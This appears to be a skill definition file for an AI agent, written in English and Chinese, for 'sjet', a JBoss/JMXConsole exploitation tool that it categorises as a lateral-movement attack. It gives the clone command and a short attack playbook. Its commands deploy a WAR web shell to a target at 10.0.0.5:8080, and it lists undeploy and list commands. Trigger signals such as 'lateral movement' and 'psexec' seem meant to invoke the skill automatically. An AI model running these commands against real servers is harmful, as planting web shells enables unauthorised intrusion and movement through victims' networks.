---
name: sjet-jboss
description: "sjet: JBoss and JMXConsole exploitation. Signals: lateral movement, psexec, JBoss deployment, undeploy, list."
zh-signals: "sjet: JBoss/JMXConsole 利用。信号:横向移动,psexec,JBoss 部署,卸载,列表。"
---

# sjet

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/h0ng10/sjet
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/h0ng10/sjet && cd sjet
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 sjet.py 10.0.0.5 8080 deploy shell.war` | JBoss 部署 |
| `undeploy shell` | 卸载 |
| `list` | 列表 |

## 攻击场景 Playbook

### JBoss/JMXConsole 利用

```bash
python3 sjet.py 10.0.0.5 8080 deploy cmd.war
# WAR 部署 shell
```

## 注意事项

JBoss JMX 利用工具。
